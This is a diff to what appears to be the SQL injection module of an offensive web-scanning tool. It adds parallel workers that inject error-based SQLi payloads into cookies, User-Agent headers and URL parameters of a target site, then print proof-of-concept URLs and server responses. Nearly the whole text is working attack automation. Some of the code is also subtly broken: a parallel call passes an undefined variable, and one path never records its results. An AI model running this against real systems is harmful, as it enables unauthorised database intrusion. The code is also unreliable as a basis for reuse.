@@ -20,6 +20,9 @@ from core.Core.colors import *
 from re import *
 import time
 from time import sleep
+from multiprocessing import Pool, TimeoutError
+from core.methods.multiproc import listsplit
+from core.variables import processes
 from urllib.request import Request, urlopen
 from modules.VlnAnalysis.Severe.errorsqlsearch import errorsqlsearch
 
@@ -30,9 +33,45 @@ info = ""
 searchinfo = ""
 properties = {}
 
-def auto0x00(web):
+def cookiepre(pay,session,check, web):
+    success = []
+    for i in pay:
+        print(B+" [*] Trying Payload : "+C+''+ i)
+        time.sleep(0.7)
+        for cookie in session.cookies:
+            cookie.value += i
+            print(O+' [+] Using '+R+'!nfected'+O+' cookie : '+GR+cookie.value)
+            r = session.get(web)
+            for j in range(0, len(check)):
+                if check[j] in r.text:
+                    poc = C+" [+] PoC : " +O+ cookie.name + " : " +GR+ cookie.value
+                    print(G+" [+] Error Based SQli (Cookie Based) Detected! ")
+                    print(poc)
+                    print(P+' [+] Code : '+W+str(r.text)+'\n')
+                    success.append(i)
+    return success
 
-    def sqlicookie0x00(web):
+def userpre(pay, web):
+    success = []
+    for i in pay:
+        print(B+' [*] Using payload : '+C+i)
+        time.sleep(0.7)
+        user_agent = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux' +
+                        'x86_64; rv:39.0) Gecko/20100101 Firefox/39.0'}
+        user_agent['User-agent'] += i
+        req = requests.get(web, headers=user_agent)
+        print(O+' [*] Using '+R+'!nfected'+O+' UA : '+GR+user_agent['User-agent'])
+        #flag = u' '.join(req.text).encode('utf-8').strip()
+        flag = " ".join(req.text).strip()
+        if 'error' in flag or 'syntax' in flag or 'MySQL'.lower() in flag.lower():
+            print(G+'\n [!] Error based SQLi (User-Agent Based) Detected!')
+            print(R+' [!] User-Agent : '+O+user_agent['User-agent'])
+            success.append(i)
+    return success
+
+def auto0x00(web, parallel):
+
+    def sqlicookie0x00(web, parallel):
 
         #print(R+'\n    =========================')
         print(R+'\n     S Q L i  (Cookie Based)')
@@ -44,43 +83,76 @@ def auto0x00(web):
         check = ["have an error", "SQL syntax", "MySQL"]
         if session.cookies:
             print(G+' [+] This website values session cookies...')
-            for i in pay:
-                print(B+" [*] Trying Payload : "+C+''+ i)
-                time.sleep(0.7)
-                for cookie in session.cookies:
-                    cookie.value += i
-                    print(O+' [+] Using '+R+'!nfected'+O+' cookie : '+GR+cookie.value)
-                    r = session.get(web)
-                    for j in range(0, len(check)):
-                        if check[j] in r.text:
-                            poc = C+" [+] PoC : " +O+ cookie.name + " : " +GR+ cookie.value
-                            print(G+" [+] Error Based SQli (Cookie Based) Detected! ")
-                            print(poc)
-                            print(P+' [+] Code : '+W+str(r.text)+'\n')
+            success = []
+            if not parallel:
+                for i in pay:
+                    print(B+" [*] Trying Payload : "+C+''+ i)
+                    time.sleep(0.7)
+                    for cookie in session.cookies:
+                        cookie.value += i
+                        print(O+' [+] Using '+R+'!nfected'+O+' cookie : '+GR+cookie.value)
+                        r = session.get(web)
+                        for j in range(0, len(check)):
+                            if check[j] in r.text:
+                                poc = C+" [+] PoC : " +O+ cookie.name + " : " +GR+ cookie.value
+                                print(G+" [+] Error Based SQli (Cookie Based) Detected! ")
+                                print(poc)
+                                print(P+' [+] Code : '+W+str(r.text)+'\n')
+                                success.append(i)
+            else:
+                paylists = listsplit(pay, round(len(pay)/processes)) 
+                with Pool(processes=processes) as pool:
+                    res = [pool.apply_async(cookiepre, args=(l,session,check,req,)) for l in paylists]
+                    #res1 = pool.apply_async(portloop, )
+                    for i in res:
+                        j = i.get()
+                        success += j
+            if success:
+                print(" [+] SQLi Vulnerability found! Successful payloads:")
+                for i in success:
+                    print(i)
+            else:
+                print(R + "\n [-] No payload succeeded."+C)
         else:
             print(R+' [-] No support for cookies...')
             time.sleep(0.5)
             print(R+' [-] Cookie based injection not possible...')
 
-    def sqliuser0x00(web):
+    def sqliuser0x00(web, parallel):
 
         #print(R+'\n    =============================')
         print(R+'\n     S Q L i  (User-Agent Based)')
         print(R+'    ––·‹›·––·‹›·––·‹›·––·‹›·––·‹›\n')
-
-        for i in pay:
-            print(B+' [*] Using payload : '+C+i)
-            time.sleep(0.7)
-            user_agent = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux' +
-                          'x86_64; rv:39.0) Gecko/20100101 Firefox/39.0'}
-            user_agent['User-agent'] += i
-            req = requests.get(web, headers=user_agent)
-            print(O+' [*] Using '+R+'!nfected'+O+' UA : '+GR+user_agent['User-agent'])
-            #flag = u' '.join(req.text).encode('utf-8').strip()
-            flag = " ".join(req.text).strip()
-            if 'error' in flag or 'syntax' in flag or 'MySQL'.lower() in flag.lower():
-                print(G+'\n [!] Error based SQLi (User-Agent Based) Detected!')
-                print(R+' [!] User-Agent : '+O+user_agent['User-agent'])
+        success = []
+        if not parallel:
+            for i in pay:
+                print(B+' [*] Using payload : '+C+i)
+                time.sleep(0.7)
+                user_agent = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux' +
+                            'x86_64; rv:39.0) Gecko/20100101 Firefox/39.0'}
+                user_agent['User-agent'] += i
+                req = requests.get(web, headers=user_agent)
+                print(O+' [*] Using '+R+'!nfected'+O+' UA : '+GR+user_agent['User-agent'])
+                #flag = u' '.join(req.text).encode('utf-8').strip()
+                flag = " ".join(req.text).strip()
+                if 'error' in flag or 'syntax' in flag or 'MySQL'.lower() in flag.lower():
+                    print(G+'\n [!] Error based SQLi (User-Agent Based) Detected!')
+                    print(R+' [!] User-Agent : '+O+user_agent['User-agent'])
+                    success.append(i)
+        else:
+            paylists = listsplit(pay, round(len(pay)/processes)) 
+            with Pool(processes=processes) as pool:
+                res = [pool.apply_async(userpre, args=(l,web,)) for l in paylists]
+                #res1 = pool.apply_async(portloop, )
+                for i in res:
+                    j = i.get()
+                    success += j
+        if success:
+            print(" [+] SQLi Vulnerability found! Successful payloads:")
+            for i in success:
+                print(i)
+        else:
+            print(R + "\n [-] No payload succeeded."+C)
 
     print(P+' [!] Enter an option :\n')
     print(B+'   [1] '+C+'Cookie Error Based Injection')
@@ -92,12 +164,28 @@ def auto0x00(web):
         errorsqlsearch(web)
     elif q == '2':
         print(GR+' [*] Launching User-Agent Error Based Module...')
-        sqliuser0x00(web)
+        sqliuser0x00(web, parallel)
     elif q == '1':
         print(GR+' [*] Launching Cookie-Based Module...')
-        sqlicookie0x00(web)
+        sqlicookie0x00(web, parallel)
 
-def manual0x00(web):
+def manualpre(pay, bugs, bug2):
+    success = []
+    for p in pay:
+        bugged = bugs + str(p) + bug2
+        print(B+" [*] Trying : "+C+bugged)
+        time.sleep(0.7)
+        response = requests.get(bugged).text
+        if (('error' in response) and ('syntax' in response) and ('SQL' in response) or ('Warning:' in response)):
+            print('\n'+G+' [+] Vulnerable link detected : ' + bugged)
+            print(GR+' [*] Injecting payloads...')
+            print(B+' [!] PoC : ' + str(bugged))
+            print(R+" [!] Payload : " + O + p + '\033[0m')
+            print("\033[1m [!] Code Snippet :\n \033[0m" + str(response) + '\n')
+            success.append(p)
+    return success
+
+def manual0x00(web, parallel):
 
     #print(R+'\n    ========================')
     print(R+'\n     S Q L i  (Manual Mode)')
@@ -123,23 +211,39 @@ def manual0x00(web):
 
     print(O+' [!] Using Url : '+GR+bugs)
     if '?' in str(bugs) and '=' in str(bugs):
-        for p in pay:
-            bugged = bugs + str(p) + bug2
-            print(B+" [*] Trying : "+C+bugged)
-            time.sleep(0.7)
-            response = requests.get(bugged).text
-            if (('error' in response) and ('syntax' in response) and ('SQL' in response) or ('Warning:' in response)):
-                print('\n'+G+' [+] Vulnerable link detected : ' + bugged)
-                print(GR+' [*] Injecting payloads...')
-                print(B+' [!] PoC : ' + str(bugged))
-                print(R+" [!] Payload : " + O + p + '\033[0m')
-                print("\033[1m [!] Code Snippet :\n \033[0m" + str(response) + '\n')
+        success = []
+        if not parallel:
+            for p in pay:
+                bugged = bugs + str(p) + bug2
+                print(B+" [*] Trying : "+C+bugged)
+                time.sleep(0.7)
+                response = requests.get(bugged).text
+                if (('error' in response) and ('syntax' in response) and ('SQL' in response) or ('Warning:' in response)):
+                    print('\n'+G+' [+] Vulnerable link detected : ' + bugged)
+                    print(GR+' [*] Injecting payloads...')
+                    print(B+' [!] PoC : ' + str(bugged))
+                    print(R+" [!] Payload : " + O + p + '\033[0m')
+                    print("\033[1m [!] Code Snippet :\n \033[0m" + str(response) + '\n')
+        else:
+            paylists = listsplit(pay, round(len(pay)/processes)) 
+            with Pool(processes=processes) as pool:
+                res = [pool.apply_async(manualpre, args=(l,bugs,bug2,)) for l in paylists]
+                #res1 = pool.apply_async(portloop, )
+                for i in res:
+                    j = i.get()
+                    success += j
+        if success:
+            print(" [+] SQLi Vulnerability found! Successful payloads:")
+            for i in success:
+                print(i)
+        else:
+            print(R + "\n [-] No payload succeeded."+C)
     else:
         print(R+' [-] Enter an URL with scope parameter...')
-        manual0x00(web)
+        manual0x00(web, parallel)
 
 def errorsqli(web):
-
+    begin = True
     while True:
         print(GR+' [*] Loading module SQLi...')
         sleep(0.6)
@@ -152,20 +256,26 @@ def errorsqli(web):
         print(GR+' [*] Importing error parameters...')
         sleep(0.8)
         try:
-            with open('files/payload-db/errorsql_payloads.lst','r') as payloads:
-                for payload in payloads:
-                    payload = payload.replace('\n','')
-                    pay.append(payload)
+            if begin:
+                with open('files/payload-db/errorsql_payloads.lst','r') as payloads:
+                    for payload in payloads:
+                        payload = payload.replace('\n','')
+                        pay.append(payload)
+                        begin = False
+
+            pa = input(" [?] Parallel Attack? (enter for not) :> ")
+            parallel = pa is not ""
+
             print(O+'\n [#] Enter the type you want to proceed:\n')
             print(B+'   [1] '+C+'Manual Mode')
             print(B+'   [2] '+C+'Automatic Mode\n')
             p = input(O+' [#] TID :> ')
             if p == '1':
                 print(GR+' [*] Initializing manual mode...')
-                manual0x00(web)
+                manual0x00(web, parallel)
             if p == '2':
                 print(GR+' [*] Loading automatic mode...')
-                auto0x00(web)
+                auto0x00(web, parallel)
 
         except IOError:
             print(R+' [-] Payloads file does not exist!')
